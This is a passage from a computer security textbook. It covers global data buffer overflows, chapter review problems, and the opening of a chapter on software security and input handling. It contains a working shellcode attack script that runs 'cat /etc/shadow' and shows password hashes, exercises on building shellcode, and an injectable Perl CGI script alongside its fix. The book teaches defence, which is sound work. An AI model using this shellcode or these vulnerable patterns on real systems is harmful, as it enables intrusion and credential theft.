value:\\r\\nroot\\r\\nroot:$1$4oInmych$T3BVS2E3OyNRGjGUzF4o3/:13347:0:99999:7:::\\r\\ndaemon:*:11453:0:99999:7:::\\r\\n. . .\\r\\nnobody:*:11453:0:99999:7:::\\r\\nknoppix:$1$p2wziIML$/yVHPQuw5kvlUFJs3b9aj/:13347:0:99999:7:::\\r\\n. . .\\r\\nM10_STAL0611_04_GE_C10.indd 374 10/11/17 3:02 PM\\n\\n\\n10.3 / OTHER FORMS OF OVERFLOW ATTACKS 375\\r\\nheap makes the possibility of predicting the address of targeted buffers extremely \\r\\ndifficult, thus thwarting the successful execution of some heap overflow attacks. Addi\\ufffetionally, if the memory allocator and deallocator include checks for corruption of the \\r\\nmanagement data, they could detect and abort any attempts to overflow outside an \\r\\nallocated area of memory.\\r\\nGlobal Data Area Overflows\\r\\nA final category of buffer overflows we consider involves buffers located in the pro\\ufffegram’s global (or static) data area. Figure 10.4 showed that this is loaded from the \\r\\nprogram file and located in memory above the program code. Again, if unsafe buffer \\r\\noperations are used, data may overflow a global buffer and change adjacent memory \\r\\nlocations, including perhaps one with a function pointer, which is then subsequently \\r\\ncalled.\\r\\nFigure 10.12a illustrates such a vulnerable program (which shares many simi\\ufffelarities with Figure 10.11a, except that the structure is declared as a global variable). \\r\\nThe design of the attack is very similar; indeed only the target address changes. The \\r\\nglobal structure was found to be at address 0x08049740, which was used as the tar\\ufffeget address in the attack. Note that global variables do not usually change location, \\r\\nas their addresses are used directly in the program code. The attack script and result \\r\\nof successfully executing it are shown in Figure 10.12b.\\r\\nMore complex variations of this attack exploit the fact that the process address \\r\\nspace may contain other management tables in regions adjacent to the global data \\r\\narea. Such tables can include references to destructor functions (a GCC C and C + +\\r\\nextension), a global-offsets table (used to resolve function references to dynamic \\r\\nlibraries once they have been loaded), and other structures. Again, the aim of the \\r\\nattack is to overwrite some function pointer that the attacker believes will then be \\r\\ncalled later by the attacked program, transferring control to shellcode of the attack\\ufffeer’s choice.\\r\\nDefenses against such attacks include making the global data area nonexecut\\ufffeable, arranging function pointers to be located below any other types of data, and \\r\\nusing guard pages between the global data area and any other management areas.\\r\\nOther Types of Overflows\\r\\nBeyond the types of buffer vulnerabilities we have discussed here, there are still more \\r\\nvariants including format string overflows and integer overflows. It is likely that even \\r\\nmore will be discovered in future. The references given the in Recommended Reading \\r\\nfor this chapter include details of additional variants. In particular, details of a range \\r\\nof buffer overflow attacks are discussed in [LHEE03] and [VEEN12].\\r\\nThe important message is that if programs are not correctly coded in the first \\r\\nplace to protect their data structures, then attacks on them are possible. While the \\r\\ndefenses we have discussed can block many such attacks, some, like the original \\r\\nexample in Figure 10.1 (which corrupts an adjacent variable value in a manner that \\r\\nalters the behavior of the attacked program), simply cannot be blocked except by \\r\\ncoding to prevent them.\\r\\nM10_STAL0611_04_GE_C10.indd 375 10/11/17 3:02 PM\\n\\n\\n376 CHAPTER 10 / BUFFER OVERFLOW\\r\\n/* global static data - will be targeted for attack */\\r\\nstruct chunk {\\r\\n char inp[64]; /* input buffer */\\r\\n void (*process)(char *); /* pointer to function to process it */\\r\\n} chunk;\\r\\nvoid showlen(char *buf)\\r\\n{\\r\\n int len;\\r\\n len = strlen(buf);\\r\\n printf(\"buffer6 read %d chars\\\\n\", len);\\r\\n}\\r\\nint main(int argc, char *argv[])\\r\\n{\\r\\n setbuf(stdin, NULL);\\r\\n chunk.process = showlen;\\r\\n printf(\"Enter value: \");\\r\\n gets(chunk.inp);\\r\\n chunk.process(chunk.inp);\\r\\n printf(\"buffer6 done\\\\n\");\\r\\n}\\r\\nFigure 10.12 Example Global Data Overflow Attack\\r\\n(a) Vulnerable global data overflow C code\\r\\n(b) Example global data overflow attack\\r\\n$ cat attack3\\r\\n#!/bin/sh\\r\\n# implement global data overflow attack against program buffer6\\r\\nperl -e \\'print pack(\"H*\",\\r\\n\"90909090909090909090909090909090\" .\\r\\n\"9090eb1a5e31c08846078d1e895e0889\" .\\r\\n\"460cb00b89f38d4e088d560ccd80e8e1\" .\\r\\n\"ffffff2f62696e2f7368202020202020\" .\\r\\n\"409704080a\");\\r\\nprint \"whoami\\\\n\";\\r\\nprint \"cat /etc/shadow\\\\n\";\\'\\r\\n$ attack3 | buffer6\\r\\nEnter value:\\r\\nroot\\r\\nroot:$1$4oInmych$T3BVS2E3OyNRGjGUzF4o3/:13347:0:99999:7:::\\r\\ndaemon:*:11453:0:99999:7:::\\r\\n....\\r\\nnobody:*:11453:0:99999:7:::\\r\\nknoppix:$1$p2wziIML$/yVHPQuw5kvlUFJs3b9aj/:13347:0:99999:7:::\\r\\n....\\r\\nM10_STAL0611_04_GE_C10.indd 376 10/11/17 3:02 PM\\n\\n\\n10.4 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 377\\r\\n10.4 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\naddress space\\r\\nbuffer\\r\\nbuffer overflow\\r\\nbuffer overrun\\r\\nguard page\\r\\nheap\\r\\nheap overflow\\r\\nlibrary function\\r\\nmemory management\\r\\nnonexecutable memory\\r\\nno-execute\\r\\nNOP sled\\r\\noff-by-one\\r\\nposition independent\\r\\nshell\\r\\nshellcode\\r\\nstack frame\\r\\nstack buffer overflow\\r\\nstack smashing\\r\\nvulnerability\\r\\nReview Questions\\r\\n10.1 Define buffer overflow.\\r\\n10.2 List the three distinct types of locations in a process address space that buffer over\\ufffeflow attacks typically target.\\r\\n10.3 Why do modern high-level programming languages not suffer from buffer overflows?\\r\\n10.4 What is stack smashing?\\r\\n10.5 How does an attacker identify vulnerable programs?\\r\\n10.6 What is a stack frame?\\r\\n10.7 Define an off-by-one attack.\\r\\n10.8 What restrictions are often found in shellcode, and how can they be avoided?\\r\\n10.9 Describe what a NOP sled is and how it is used in a buffer overflow attack.\\r\\n10.10 List some of the different operations an attacker may design shellcode to perform.\\r\\n10.11 What are the two broad categories of defenses against buffer overflows?\\r\\n10.12 List and briefly describe some of the defenses against buffer overflows that can be \\r\\nused when compiling new programs.\\r\\n10.13 List and briefly describe some of the defenses against buffer overflows that can be \\r\\nimplemented when running existing vulnerable programs.\\r\\n10.14 What is the importance of a no-execute bit in the x86 processor family?\\r\\n10.15 What is the main functionality of a stackguard?\\r\\n10.16 Describe one possible approach to overcome a global data area overflow attack.\\r\\nProblems\\r\\n10.1 Investigate each of the unsafe standard C library functions shown in Figure 10.2 using the \\r\\nUNIX man pages or any C programming text, and determine a safer alternative to use.\\r\\n10.2 Execute the program shown in Figure 10.1a with an input SECURITYSECURITY \\r\\nand explain the output of the program.\\r\\n10.3 Execute the program shown in Figure 10.5a with an input “Computer Engineering” \\r\\nand explain the output of the program.\\r\\n10.4 Execute the program shown in Figure 10.7a with an input “Computer Security” and \\r\\nexplain the output of the program.\\r\\nM10_STAL0611_04_GE_C10.indd 377 10/11/17 3:02 PM\\n\\n\\n378 CHAPTER 10 / BUFFER OVERFLOW\\r\\n10.5 The example shellcode shown in Figure 10.8b assumes that the execve system call will \\r\\nnot return (which is the case as long as it is successful). However, to cover the pos\\ufffesibility that it might fail, the code could be extended to include another system call \\r\\nafter it, this time to exit(0). This would cause the program to exit normally, attracting \\r\\nless attention than allowing it to crash. Extend this shellcode with the extra assembler \\r\\ninstructions needed to marshal arguments and call this system function.\\r\\n10.6 Experiment with running the stack overflow attack using either the original shellcode \\r\\nfrom Figure 10.8b or the modified code from Problem 1.5, against an example vulner\\ufffeable program. You will need to use an older O/S release that does not include stack \\r\\nprotection by default. You will also need to determine the buffer and stack frame loca\\ufffetions, determine the resulting attack string, and write a simple program to encode this \\r\\nto implement the attack.\\r\\n10.7 Determine what assembly language instructions would be needed to implement shell\\ufffecode functionality shown in Figure 10.8a on a PowerPC processor (such as has been \\r\\nused by older MacOS or PPC Linux distributions).\\r\\n10.8 Investigate the use of a replacement standard C string library, such as Libsafe, bstring, \\r\\nvstr, or other. Determine how significant the required code changes are, if any, to use \\r\\nthe chosen library.\\r\\n10.9 Determine the shellcode needed to implement a return to system call attack that calls \\r\\nsystem(“whoami; cat /etc/shadow; exit;”), targeting the same vulnerable program as \\r\\nused in Problem 10.6. You need to identify the location of the standard library system() \\r\\nfunction on the target system by tracing a suitable test program with a debugger. You \\r\\nthen need to determine the correct sequence of address and data values to use in the \\r\\nattack string. Experiment with running this attack.\\r\\n10.10 Rewrite the functions shown in Figure 10.10 so they are no longer vulnerable to a \\r\\nbuffer overflow attack.\\r\\n10.11 Rewrite the program shown in Figure 10.11a so it is no longer vulnerable to a heap \\r\\nbuffer overflow.\\r\\n10.12 Review some of the recent vulnerability announcements from CERT, SANS, or simi\\ufffelar organizations. Identify a number that occur as a result of a buffer overflow attack. \\r\\nClassify the type of buffer overflow used in each, and decide if it is one of the forms \\r\\nwe discuss in this chapter or another variant.\\r\\n10.13 What are format string attacks? List the format functions defined in the ANSI C stan\\ufffedard which can expose an application to this vulnerability. Suggest guidelines to avoid \\r\\nformat string vulnerabilities when developing an application.\\r\\n10.14 What are integer overflows? What are their security implications? Suggest guidelines \\r\\nto mitigate integer overflow problems.\\r\\nM10_STAL0611_04_GE_C10.indd 378 10/11/17 3:02 PM\\n\\n\\n379\\r\\n11.1 Software Security Issues\\r\\nIntroducing Software Security and Defensive Programming\\r\\n11.2 Handling Program Input\\r\\nInput Size and Buffer Overflow\\r\\nInterpretation of Program Input\\r\\nValidating Input Syntax\\r\\nInput Fuzzing\\r\\n11.3 Writing Safe Program Code\\r\\nCorrect Algorithm Implementation\\r\\nEnsuring that Machine Language Corresponds to Algorithm\\r\\nCorrect Interpretation of Data Values\\r\\nCorrect Use of Memory\\r\\nPreventing Race Conditions with Shared Memory\\r\\n11.4 Interacting with the Operating System and Other Programs\\r\\nEnvironment Variables\\r\\nUsing Appropriate, Least Privileges\\r\\nSystems Calls and Standard Library Functions\\r\\nPreventing Race Conditions with Shared System Resources\\r\\nSafe Temporary File Use\\r\\nInteracting with Other Programs\\r\\n11.5 Handling Program Output\\r\\n11.6 Key Terms, Review Questions, and Problems\\r\\nSoftware Security\\r\\nCHAPTER \\r\\nM11_STAL0611_04_GE_C11.indd 379 10/11/17 3:02 PM\\n\\n\\n380 CHAPTER 11 / SOFTWARE SECURITY\\r\\nIn Chapter 10, we described the problem of buffer overflows, which continue to be \\r\\none of the most common and widely exploited software vulnerabilities. Although we \\r\\ndiscuss a number of countermeasures, the best defense against this threat is not to \\r\\nallow it to occur at all. That is, programs need to be written securely to prevent such \\r\\nvulnerabilities occurring.\\r\\nMore generally, buffer overflows are just one of a range of deficiencies found \\r\\nin poorly written programs. There are many vulnerabilities related to program defi\\ufffeciencies that result in the subversion of security mechanisms and allow unauthorized \\r\\naccess and use of computer data and resources.\\r\\nThis chapter explores the general topic of software security. We introduce a \\r\\nsimple model of a computer program that helps identify where security concerns may \\r\\noccur. We then explore the key issue of how to correctly handle program input to \\r\\nprevent many types of vulnerabilities and, more generally, how to write safe program \\r\\ncode and manage the interactions with other programs and the operating system.\\r\\n11.1 SOFTWARE SECURITY ISSUES\\r\\nIntroducing Software Security and Defensive Programming\\r\\nMany computer security vulnerabilities result from poor programming practices, which \\r\\nthe Veracode State of Software Security Report [VERA16] notes are far more preva\\ufffelent than most people think. The CWE/SANS Top 25 Most Dangerous Software Errors \\r\\nlist, summarized in Table 11.1, details the consensus view on the poor programming \\r\\npractices that are the cause of the majority of cyber attacks. These errors are grouped \\r\\ninto three categories: insecure interaction between components, risky resource man\\ufffeagement, and porous defenses. Similarly, the Open Web Application Security Project \\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Describe how many computer security vulnerabilities are a result of poor \\r\\nprogramming practices.\\r\\n◆ Describe an abstract view of a program, and detail where potential points of \\r\\nvulnerability exist in this view.\\r\\n◆ Describe how a defensive programming approach will always validate any \\r\\nassumptions made, and is designed to fail gracefully and safely whenever \\r\\nerrors occur.\\r\\n◆ Detail the many problems that occur as a result of incorrectly handling pro\\ufffegram input, failing to check its size or interpretation.\\r\\n◆ Describe problems that occur in implementing some algorithm.\\r\\n◆ Describe problems that occur as a result of interaction between programs \\r\\nand O/S components.\\r\\n◆ Describe problems that occur when generating program output.\\r\\nM11_STAL0611_04_GE_C11.indd 380 10/11/17 3:02 PM\\n\\n\\n11.1 / SOFTWARE SECURITY ISSUES 381\\r\\nTop Ten [OWAS13] list of critical Web application security flaws includes five related \\r\\nto insecure software code. These include unvalidated input, cross-site scripting, buffer \\r\\noverflow, injection flaws, and improper error handling. These flaws occur as a conse\\ufffequence of insufficient checking and validation of data and error codes in programs. We \\r\\nwill discuss most of these flaws in this chapter. Awareness of these issues is a critical \\r\\ninitial step in writing more secure program code. Both these sources emphasize the need \\r\\nfor software developers to address these known areas of concern, and provide guidance \\r\\non how this is done. The NIST report NISTIR 8151 (Dramatically Reducing Software \\r\\nVulnerabilities, October 2016) presents a range of approaches with the aim of dramati\\ufffecally reducing the number of software vulnerabilities. It recommends the following:\\r\\n• Stopping vulnerabilities before they occur by using improved methods for \\r\\nspecifying and building software.\\r\\n• Finding vulnerabilities before they can be exploited by using better and more \\r\\nefficient testing techniques.\\r\\n• Reducing the impact of vulnerabilities by building more resilient architectures.\\r\\nSoftware security is closely related to software quality and reliability, but with \\r\\nsubtle differences. Software quality and reliability is concerned with the accidental \\r\\nSoftware Error Category: Insecure Interaction Between Components\\r\\nImproper Neutralization of Special Elements used in an SQL Command (“SQL Injection”)\\r\\nImproper Neutralization of Special Elements used in an OS Command (“OS Command \\r\\nInjection”)\\r\\nImproper Neutralization of Input During Web Page Generation (“Cross-site Scripting”)\\r\\nUnrestricted Upload of File with Dangerous Type\\r\\nCross-Site Request Forgery (CSRF)\\r\\nURL Redirection to Untrusted Site (“Open Redirect”)\\r\\nSoftware Error Category: Risky Resource Management\\r\\nBuffer Copy without Checking Size of Input (“Classic Buffer Overflow”)\\r\\nImproper Limitation of a Pathname to a Restricted Directory (“Path Traversal”)\\r\\nDownload of Code Without Integrity Check\\r\\nInclusion of Functionality from Untrusted Control Sphere\\r\\nUse of Potentially Dangerous Function\\r\\nIncorrect Calculation of Buffer Size\\r\\nUncontrolled Format String\\r\\nInteger Overflow or Wraparound\\r\\nSoftware Error Category: Porous Defenses\\r\\nMissing Authentication for Critical Function\\r\\nMissing Authorization\\r\\nUse of Hard-coded Credentials\\r\\nMissing Encryption of Sensitive Data\\r\\nReliance on Untrusted Inputs in a Security Decision\\r\\nExecution with Unnecessary Privileges\\r\\nIncorrect Authorization\\r\\nIncorrect Permission Assignment for Critical Resource\\r\\nUse of a Broken or Risky Cryptographic Algorithm\\r\\nImproper Restriction of Excessive Authentication Attempts\\r\\nUse of a One-Way Hash without a Salt\\r\\nTable 11.1 CWE/SANS TOP 25 Most Dangerous Software Errors (2011)\\r\\nM11_STAL0611_04_GE_C11.indd 381 10/11/17 3:02 PM\\n\\n\\n382 CHAPTER 11 / SOFTWARE SECURITY\\r\\nfailure of a program as a result of some theoretically random, unanticipated input, \\r\\nsystem interaction, or use of incorrect code. These failures are expected to follow \\r\\nsome form of probability distribution. The usual approach to improve software qual\\ufffeity is to use some form of structured design and testing to identify and eliminate as \\r\\nmany bugs as is reasonably possible from a program. The testing usually involves \\r\\nvariations of likely inputs and common errors, with the intent of minimizing the num\\ufffeber of bugs that would be seen in general use. The concern is not the total number \\r\\nof bugs in a program, but how often they are triggered, resulting in program failure.\\r\\nSoftware security differs in that the attacker chooses the probability distri\\ufffebution, targeting specific bugs that result in a failure that can be exploited by the \\r\\nattacker. These bugs may often be triggered by inputs that differ dramatically from \\r\\nwhat is usually expected, and hence are unlikely to be identified by common test\\ufffeing approaches. Writing secure, safe code requires attention to all aspects of how a \\r\\nprogram executes, the environment it executes in, and the type of data it processes. \\r\\nNothing can be assumed, and all potential errors must be checked. These issues are \\r\\nhighlighted in the following definition:\\r\\nDefensive or Secure Programming is the process of designing and implement\\ufffeing software so it continues to function even when under attack. Software writ\\ufffeten using this process is able to detect erroneous conditions resulting from some \\r\\nattack, and to either continue executing safely, or to fail gracefully. The key rule in \\r\\ndefensive programming is to never assume anything, but to check all assumptions \\r\\nand to handle any possible error states.\\r\\nThis definition emphasizes the need to make explicit any assumptions about how a \\r\\nprogram will run, and the types of input it will process. To help clarify the issues, con\\ufffesider the abstract model of a program shown in Figure 11.1.1\\r\\n This illustrates the concepts \\r\\ntaught in most introductory programming courses. A program reads input data from a \\r\\nvariety of possible sources, processes that data according to some algorithm then gener\\ufffeates output, possibly to multiple different destinations. It executes in the environment \\r\\nprovided by some operating system, using the machine instructions of some specific \\r\\nprocessor type. While processing the data, the program will use system calls, and pos\\ufffesibly other programs available on the system. These may result in data being saved or \\r\\nmodified on the system or cause some other side effect as a result of the program \\r\\nexecution. All of these aspects can interact with each other, often in complex ways.\\r\\nWhen writing a program, programmers typically focus on what is needed to \\r\\nsolve whatever problem the program addresses. Hence their attention is on the steps \\r\\nneeded for success and the normal flow of execution of the program rather than \\r\\nconsidering every potential point of failure. They often make assumptions about the \\r\\ntype of inputs a program will receive and the environment it executes in. Defensive \\r\\nprogramming means these assumptions need to be validated by the program and \\r\\nall potential failures handled gracefully and safely. Correctly anticipating, checking, \\r\\n1\\r\\nThis figure expands and elaborates on Figure 1-1 in [WHEE03].\\r\\nM11_STAL0611_04_GE_C11.indd 382 10/11/17 3:02 PM\\n\\n\\n11.1 / SOFTWARE SECURITY ISSUES 383\\r\\nand handling all possible errors will certainly increase the amount of code needed \\r\\nin, and the time taken to write, a program. This conflicts with business pressures to \\r\\nkeep development times as short as possible to maximize market advantage. Unless \\r\\nsoftware security is a design goal, addressed from the start of program development, \\r\\na secure program is unlikely to result.\\r\\nFurther, when changes are required to a program, the programmer often focuses \\r\\non the changes required and what needs to be achieved. Again, defensive program\\ufffeming means that the programmer must carefully check any assumptions made, check \\r\\nand handle all possible errors, and carefully check any interactions with existing code. \\r\\nFailure to identify and manage such interactions can result in incorrect program \\r\\nbehavior and the introduction of vulnerabilities into a previously secure program.\\r\\nDefensive programming thus requires a changed mindset to traditional pro\\ufffegramming practices, with their emphasis on programs that solve the desired problem \\r\\nfor most users, most of the time. This changed mindset means the programmer needs \\r\\nan awareness of the consequences of failure and the techniques used by attackers. \\r\\nParanoia is a virtue, because the enormous growth in vulnerability reports really does \\r\\nshow that attackers are out to get you! This mindset has to recognize that normal \\r\\ntesting techniques will not identify many of the vulnerabilities that may exist but that \\r\\nare triggered by highly unusual and unexpected inputs. It means that lessons must be \\r\\nlearned from previous failures, ensuring that new programs will not suffer the same \\r\\nweaknesses. It means that programs should be engineered, as far as possible, to be \\r\\nas resilient as possible in the face of any error or unexpected condition. Defensive \\r\\nprogrammers have to understand how failures can occur and the steps needed to \\r\\nreduce the chance of them occurring in their programs.\\r\\nThe necessity for security and reliability to be design goals from the inception of \\r\\na project has long been recognized by most engineering disciplines. Society in general \\r\\nis intolerant of bridges collapsing, buildings falling down, or airplanes crashing. The \\r\\ndesign of such items is expected to provide a high likelihood that these catastrophic \\r\\nFigure 11.1 Abstract View of Program\\r\\nDatabase\\r\\nMachine Hardware\\r\\nOperating System\\r\\nDBMS\\r\\nOther\\r\\nprograms\\r\\nFile System\\r\\nNetwork Link\\r\\nProgram\\r\\nGUI Display\\r\\nKeyboard\\r\\n& Mouse\\r\\nExecuting algorithm,\\r\\nprocessing input data,\\r\\ngenerating output\\r\\nComputer System\\r\\nM11_STAL0611_04_GE_C11.indd 383 10/11/17 3:02 PM\\n\\n\\n384 CHAPTER 11 / SOFTWARE SECURITY\\r\\nevents will not occur. Software development has not yet reached this level of matu\\uffferity, and society tolerates far higher levels of failure in software than it does in other \\r\\nengineering disciplines. This is despite the best efforts of software engineers and the \\r\\ndevelopment of a number of software development and quality standards such as ISO \\r\\n12207 (Information technology - Software lifecycle processes, 1997) or [SEI06]. While \\r\\nthe focus of these standards is on the general software development life cycle, they \\r\\nincreasingly identify security as a key design goal. Recent years have seen increasing \\r\\nefforts to improve secure software development processes. The Software Assurance \\r\\nForum for Excellence in Code (SAFECode), with a number of major IT industry \\r\\ncompanies as members, develop publications outlining industry best practices for \\r\\nsoftware assurance and providing practical advice for implementing proven methods \\r\\nfor secure software development, including [SIMP11]. We will discuss many of their \\r\\nrecommended software security practices in this chapter.\\r\\nHowever, the broader topic of software development techniques and standards, \\r\\nand the integration of security with them, is well beyond the scope of this text. \\r\\n[MCGR06] and [VIEG01] provide much greater detail on these topics. [SIMP11] rec\\ufffeommends incorporating threat modeling, also known as risk analysis, as part of the \\r\\ndesign process. We will discuss this area more generally in Chapter 14. Here, we explore \\r\\nsome specific software security issues that should be incorporated into a wider develop\\ufffement methodology. We examine the software security concerns of the various interac\\ufffetions with an executing program, as illustrated in Figure 11.1. We start with the critical \\r\\nissue of safe input handling, followed by security concerns related to algorithm imple\\ufffementation, interaction with other components, and program output. When looking at \\r\\nthese potential areas of concern, it is worth acknowledging that many security vulner\\ufffeabilities result from a small set of common mistakes. We discuss a number of these.\\r\\nThe examples in this chapter focus primarily on problems seen in Web applica\\ufffetion security. The rapid development of such applications, often by developers with \\r\\ninsufficient awareness of security concerns, and their accessibility via the Internet to \\r\\na potentially large pool of attackers mean these applications are particularly vulner\\ufffeable. However, we emphasize that the principles discussed apply to all programs. \\r\\nSafe programming practices should always be followed, even for seemingly innocuous \\r\\nprograms, because it is very difficult to predict the future uses of programs. It is always \\r\\npossible that a simple utility, designed for local use, may later be incorporated into a \\r\\nlarger application, perhaps Web-enabled, with significantly different security concerns.\\r\\n11.2 HANDLING PROGRAM INPUT\\r\\nIncorrect handling of program input is one of the most common failings in software \\r\\nsecurity. Program input refers to any source of data that originates outside the \\r\\nprogram and whose value is not explicitly known by the programmer when the code \\r\\nwas written. This obviously includes data read into the program from user keyboard \\r\\nor mouse entry, files, or network connections. However, it also includes data supplied \\r\\nto the program in the execution environment, the values of any configuration or other \\r\\ndata read from files by the program, and values supplied by the operating system \\r\\nto the program. All sources of input data, and any assumptions about the size and \\r\\ntype of values they take, have to be identified. Those assumptions must be explicitly \\r\\nM11_STAL0611_04_GE_C11.indd 384 10/11/17 3:02 PM\\n\\n\\n11.2 / HANDLING PROGRAM INPUT 385\\r\\nverified by the program code, and the values must be used in a manner consistent \\r\\nwith these assumptions. The two key areas of concern for any input are the size of \\r\\nthe input and the meaning and interpretation of the input.\\r\\nInput Size and Buffer Overflow\\r\\nWhen reading or copying input from some source, programmers often make assump\\ufffetions about the maximum expected size of input. If the input is text entered by the \\r\\nuser, either as a command-line argument to the program or in response to a prompt \\r\\nfor input, the assumption is often that this input would not exceed a few lines in size. \\r\\nConsequently, the programmer allocates a buffer of typically 512 or 1024 bytes to \\r\\nhold this input but often does not check to confirm that the input is indeed no more \\r\\nthan this size. If it does exceed the size of the buffer, then a buffer overflow occurs, \\r\\nwhich can potentially compromise the execution of the program. We discussed the \\r\\nproblems of buffer overflows in detail in Chapter 10. Testing of such programs may \\r\\nwell not identify the buffer overflow vulnerability, as the test inputs provided would \\r\\nusually reflect the range of inputs the programmers expect users to provide. These test \\r\\ninputs are unlikely to include sufficiently large inputs to trigger the overflow, unless \\r\\nthis vulnerability is being explicitly tested.\\r\\nA number of widely used standard C library routines, some listed in Table 10.2, \\r\\ncompound this problem by not providing any means of limiting the amount of data \\r\\ntransferred to the space available in the buffer. We discuss a range of safe program\\ufffeming practices related to preventing buffer overflows in Section 10.2. These include \\r\\nthe use of safe string and buffer copying routines, and an awareness of these software \\r\\nsecurity traps by programmers.\\r\\nWriting code that is safe against buffer overflows requires a mindset that \\r\\nregards any input as dangerous and processes it in a manner that does not expose \\r\\nthe program to danger. With respect to the size of input, this means either using a \\r\\ndynamically sized buffer to ensure that sufficient space is available or processing the \\r\\ninput in buffer sized blocks. Even if dynamically sized buffers are used, care is needed \\r\\nto ensure that the space requested does not exceed available memory. Should this \\r\\noccur, the program must handle this error gracefully. This may involve processing the \\r\\ninput in blocks, discarding excess input, terminating the program, or any other action \\r\\nthat is reasonable in response to such an abnormal situation. These checks must apply \\r\\nwherever data whose value is unknown enter, or are manipulated by, the program. \\r\\nThey must also apply to all potential sources of input.\\r\\nInterpretation of Program Input\\r\\nThe other key concern with program input is its meaning and interpretation. Program \\r\\ninput data may be broadly classified as textual or binary. When processing binary data, \\r\\nthe program assumes some interpretation of the raw binary values as representing \\r\\nintegers, floating-point numbers, character strings, or some more complex structured \\r\\ndata representation. The assumed interpretation must be validated as the binary \\r\\nvalues are read. The details of how this is done will depend very much on the par\\ufffeticular interpretation of encoding of the information. As an example, consider the \\r\\ncomplex binary structures used by network protocols in Ethernet frames, IP packets, \\r\\nand TCP segments, which the networking code must carefully construct and validate. \\r\\nM11_STAL0611_04_GE_C11.indd 385 10/11/17 3:02 PM\\n\\n\\n386 CHAPTER 11 / SOFTWARE SECURITY\\r\\nAt a higher layer, DNS, SNMP, NFS, and other protocols use binary encoding of the \\r\\nrequests and responses exchanged between parties using these protocols. These are \\r\\noften specified using some abstract syntax language, and any specified values must \\r\\nbe validated against this specification.\\r\\nThe 2014 Heartbleed OpenSSL bug, which we will discuss further in Section \\r\\n22.3, is a recent example of a failure to check the validity of a binary input value. \\r\\nBecause of a coding error, failing to check the amount of data requested for return \\r\\nagainst the amount supplied, an attacker could access the contents of adjacent mem\\ufffeory. This memory could contain information such as user names and passwords, pri\\ufffevate keys, and other sensitive information. This bug potentially compromised a very \\r\\nlarge numbers of servers and their users. It is an example of a buffer over-read.\\r\\nMore commonly, programs process textual data as input. The raw binary values \\r\\nare interpreted as representing characters, according to some character set. Tradi\\ufffetionally, the ASCII character set was assumed, although common systems like Win\\ufffedows and MacOS both use different extensions to manage accented characters. With \\r\\nincreasing internationalization of programs, there is an increasing variety of character \\r\\nsets being used. Care is needed to identify just which set is being used, and hence just \\r\\nwhat characters are being read.\\r\\nBeyond identifying which characters are input, their meaning must be identi\\ufffefied. They may represent an integer or floating-point number. They might be a file\\ufffename, a URL, an e-mail address, or an identifier of some form. Depending on how \\r\\nthese inputs are used, it may be necessary to confirm that the values entered do \\r\\nindeed represent the expected type of data. Failure to do so could result in a vulner\\ufffeability that permits an attacker to influence the operation of the program, with pos\\ufffesibly serious consequences.\\r\\nTo illustrate the problems with interpretation of textual input data, we first \\r\\ndiscuss the general class of injection attacks that exploit failure to validate the inter\\ufffepretation of input. We then review mechanisms for validating input data and the \\r\\nhandling of internationalized inputs using a variety of character sets.\\r\\nINJECTION ATTACKS The term injection attack refers to a wide variety of program \\r\\nflaws related to invalid handling of input data. Specifically, this problem occurs when \\r\\nprogram input data can accidentally or deliberately influence the flow of execution \\r\\nof the program. There are a wide variety of mechanisms by which this can occur. One \\r\\nof the most common is when input data are passed as a parameter to another helper \\r\\nprogram on the system, whose output is then processed and used by the original pro\\ufffegram. This most often occurs when programs are developed using scripting languages \\r\\nsuch as Perl, PHP, python, sh, and many others. Such languages encourage the reuse \\r\\nof other existing programs and system utilities where possible to save coding effort. \\r\\nThey may be used to develop applications on some system. More commonly, they \\r\\nare now often used as Web CGI scripts to process data supplied from HTML forms.\\r\\nConsider the example perl CGI script shown in Figure 11.2a, which is designed \\r\\nto return some basic details on the specified user using the UNIX finger command. \\r\\nThis script would be placed in a suitable location on the Web server and invoked in \\r\\nresponse to a simple form, such as that shown in Figure 11.2b. The script retrieves the \\r\\ndesired information by running a program on the server system, and returning the \\r\\noutput of that program, suitably reformatted if necessary, in a HTML webpage. \\r\\nM11_STAL0611_04_GE_C11.indd 386 10/11/17 3:02 PM\\n\\n\\n11.2 / HANDLING PROGRAM INPUT 387\\r\\n1 #!/usr/bin/perl\\r\\n2 # finger.cgi - finger CGI script using Perl5 CGI module\\r\\n3\\r\\n4 use CGI;\\r\\n5 use CGI::Carp qw(fatalsToBrowser);\\r\\n6 $q = new CGI; # create query object\\r\\n7\\r\\n8 # display HTML header\\r\\n9 print $q->header,\\r\\n10 $q->start_html(\\'Finger User\\'),\\r\\n11 $q->h1(\\'Finger User\\');\\r\\n12 print \"<pre>\";\\r\\n13\\r\\n14 # get name of user and display their finger details\\r\\n15 $user = $q->param(\"user\");\\r\\n16 print `/usr/bin/finger -sh $user`;\\r\\n17\\r\\n18 # display HTML footer\\r\\n19 print \"</pre>\";\\r\\n20 print $q->end_html;\\r\\nFigure 11.2 A Web CGI Injection Attack\\r\\n(a) Unsafe Perl finger CGI script\\r\\n(b) Finger form\\r\\n(c) Expected and subverted finger CGI responses\\r\\n(d) Safety extension to Perl finger CGI script\\r\\n<html><head><title>Finger User</title></head><body>\\r\\n<h1>Finger User</h1>\\r\\n<form method=post action=\"finger.cgi\">\\r\\n<b>Username to finger</b>: <input type=text name=user value=\"\">\\r\\n<p><input type=submit value=\"Finger User\">\\r\\n</form></body></html>\\r\\nFinger User\\r\\nLogin Name TTY Idle Login Time Where\\r\\nlpb Lawrie Brown p0 Sat 15:24 ppp41.grapevine\\r\\nFinger User\\r\\nattack success\\r\\n-rwxr-xr-x 1 lpb staff 537 Oct 21 16:19 finger.cgi\\r\\n-rw-r--r-- 1 lpb staff 251 Oct 21 16:14 finger.html\\r\\n14 # get name of user and display their finger details\\r\\n15 $user = $q->param(\"user\");\\r\\n16 die \"The specified user contains illegal characters!\"\\r\\n17 unless ($user =~ /^\\\\w+$/);\\r\\n18 print `/usr/bin/finger -sh $user`;\\r\\nM11_STAL0611_04_GE_C11.indd 387 10/11/17 3:02 PM\\n\\n\\n388 CHAPTER 11 / SOFTWARE SECURITY\\r\\nThis type of simple form and associated handler were widely seen and were often pre\\ufffesented as simple examples of how to write and use CGI scripts. Unfortunately, this script \\r\\ncontains a critical vulnerability. The value of the user is passed directly to the finger \\r\\nprogram as a parameter. If the identifier of a legitimate user is supplied, for example, \\r\\nlpb, then the 